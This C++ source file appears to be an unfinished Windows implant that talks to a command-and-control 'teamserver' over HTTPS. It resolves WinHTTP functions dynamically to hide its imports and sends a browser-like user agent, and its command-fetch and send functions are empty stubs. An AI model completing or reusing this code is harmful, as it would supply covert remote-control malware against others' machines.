#include <string>
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include "Utils.h"
#include "HttpsCommunicator.h"

std::string GetLatestCommand(std::string teamserverIp) {


    return std::string("");
}

static std::string SendRequest(std::string teamserverIp, HttpsCommunicator::Method method, std::string endpoint) {
    HMODULE hModule = LoadLibraryA("winhttp.dll");
    WinHttpOpenFunctionPointer WinHttpOpen = (WinHttpOpenFunctionPointer)GetProcAddress(hModule, "WinHttpOpen");
    WinHttpConnectFunctionPointer WinHttpConnect = (WinHttpConnectFunctionPointer)GetProcAddress(hModule, "WinHttpConnect");
    WinHttpOpenRequestFunctionPointer WinHttpOpenRequest = (WinHttpOpenRequestFunctionPointer)GetProcAddress(hModule, "WinHttpOpenRequest");

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (platform; rv:gecko-version) Gecko/gecko-trail Firefox/firefox-version", // user agent - LPCWSTR
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, // proxy aware requests
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS
    );

    if (hSession == NULL) {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return std::string("");
    }

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        Utils::toWCharStr(teamserverIp).c_str(), // host-ul accesat
        INTERNET_DEFAULT_HTTPS_PORT, // folosim portul https - 443
        0
    );

    if (hConnect == NULL) {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return std::string("");
    }

    std::string methodStr = "GET";
    switch (method)
    {
    case HttpsCommunicator::GET:
        methodStr = "GET";
        break;
    case HttpsCommunicator::POST:
        methodStr = "POST";
        break;
    default:
        break;
    }

    HINTERNET hReq = WinHttpOpenRequest(
        hConnect,
        Utils::toWCharStr(methodStr).c_str(), // metoda folosita
        Utils::toWCharStr(endpoint).c_str(), // endpoint-ul accesat
        NULL, // NULL - foloseste HTTP/1.1
        WINHTTP_NO_REFERER, // nu va folosi referer
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    if (hReq == NULL) {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return std::string("");
    }
    
    return std::string("");
}